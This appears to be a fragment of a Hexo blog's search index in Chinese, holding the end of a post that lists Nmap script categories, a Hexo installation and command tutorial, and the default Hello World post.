提供暴力破解方式，针对常见的应用如http/snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br><strong>常用的有 auth   brute   vuln</strong></p>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h2><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="https://nodejs.org/en/">Node.js</a>(Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a><br>如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 <a href="#anzhuang">安装 Hexo</a> 步骤。<br>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。<h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2></li><li>Windows：下载并安装 git.</li><li>Mac：使用 Homebrew, MacPorts 或者下载 安装程序。</li><li>Linux (Ubuntu, Debian)：sudo apt-get install git-core</li><li>Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core</li></ul><blockquote><h2 id="Mac-用户"><a href="#Mac-用户" class="headerlink" title="Mac 用户"></a>Mac 用户</h2><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入<br>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install 安装命令行工具。</p><h2 id="Windows-用户"><a href="#Windows-用户" class="headerlink" title="Windows 用户"></a>Windows 用户</h2><p> 对于中国大陆地区用户，可以前往 淘宝 Git for Windows 镜像 下载 git 安装包。<br>安装 Node.js<br>Node.js 为大多数平台提供了官方的 安装程序。对于中国大陆地区用户，可以前往 淘宝 Node.js 镜像 下载。</p></blockquote><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>Node.js 为大多数平台提供了官方的 安装程序。对于中国大陆地区用户，可以前往 淘宝 Node.js 镜像 下载。<br>其它的安装方法：</p><ul><li>Windows：通过 nvs（推荐）或者nvm 安装。</li><li>Mac：使用 Homebrew 或 MacPorts 安装。</li><li>Linux（DEB/RPM-based）：从 NodeSource 安装。<br>其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 指导<br>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a><span id="anzhuang">安装 Hexo</span></h2>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。<blockquote><p>$ npm install -g hexo-cli</p></blockquote><h2 id="进阶安装和使用"><a href="#进阶安装和使用" class="headerlink" title="进阶安装和使用"></a>进阶安装和使用</h2>对于熟悉 npm 的进阶用户，可以仅局部安装 hexo 包。<blockquote><p>$ npm install hexo</p></blockquote></li></ul><p>安装以后，可以使用以下两种方式执行 Hexo：<br>1.npx hexo <command><br>2.将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p><blockquote><p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p></blockquote><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><blockquote><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install</folder></folder></p></blockquote><p>新建完成后，指定文件夹的目录如下：</p><blockquote><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes</p></blockquote><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><blockquote><p>package.json<br>{<br>  “name”: “hexo-site”,<br>  “version”: “0.0.0”,<br>  “private”: true,<br>  “hexo”: {<br>    “version”: “”<br>  },<br>  “dependencies”: {<br>    “hexo”: “^3.8.0”,<br>    “hexo-generator-archive”: “^0.1.5”,<br>    “hexo-generator-category”: “^0.1.3”,<br>    “hexo-generator-index”: “^0.2.1”,<br>    “hexo-generator-tag”: “^0.2.0”,<br>    “hexo-renderer-ejs”: “^0.3.1”,<br>    “hexo-renderer-stylus”: “^0.3.3”,<br>    “hexo-renderer-marked”: “^0.3.2”,<br>    “hexo-server”: “^0.3.3”<br>  }<br>}</p></blockquote><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。<br>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p>主题 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><blockquote><p>$ hexo init [folder]</p></blockquote><p>新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。</p><p>本命令相当于执行了以下几步：</p><ul><li>Git clone hexo-starter 和 hexo-theme-landscape 主题到当前目录或指定目录。</li><li>使用 Yarn 1、pnpm 或 npm 包管理器下载依赖（如有已安装多个，则列在前面的优先）。npm 默认随 Node.js 安装。<h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><blockquote><p>$ hexo generate</p></blockquote>生成静态文件。</li></ul><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr><tr><td>-b, –bail</td><td>生成过程中如果发生任何未处理的异常则抛出异常</td></tr><tr><td>-f, –force</td><td>强制重新生成文件Hexo 引入了差分机制，如果 public 目录存在，那么 hexo 只会重新生成改动的文件。使用该参数的效果接近 hexo clean &amp;&amp; hexo generate</td></tr><tr><td>-c, –concurrency</td><td>最大同时生成文件的数量，默认无限制</td></tr></tbody></table><p>该命令可以简写为</p><blockquote><p>$ hexo g</p></blockquote><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><blockquote><p>$ hexo publish [layout] &lt; filename &gt;</p></blockquote><p>发表草稿。</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><blockquote><p>$ hexo server</p></blockquote><p>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/%E3%80%82">http://localhost:4000/。</a></p><blockquote><p>-p, –port    重设端口<br>-s, –static    只使用静态文件<br>-l, –log    启动日记记录，使用覆盖记录格式</p></blockquote><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><blockquote><p>$ hexo deploy</p></blockquote><p>部署网站。</p><blockquote><p>-g, –generate    部署之前预先生成静态文件</p></blockquote><p>该命令可以简写为：</p><blockquote><p>$ hexo d</p></blockquote><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><blockquote><p>$ hexo render &lt; file1&gt; [file2] …</p></blockquote><p>渲染文件。</p><blockquote><p>-o, –output    设置输出路径</p></blockquote><h3 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h3><blockquote><p>$ hexo migrate &lt; type&gt;</p></blockquote><p>从其他博客系统 迁移内容。</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><blockquote><p>$ hexo clean</p></blockquote><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><blockquote><p>$ hexo list &lt; type&gt;</p></blockquote><p>列出网站资料。</p><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><blockquote><p>$ hexo version</p></blockquote><p>显示 Hexo 版本。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/05/16/hello-world/"/>
    <url>/2021/05/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
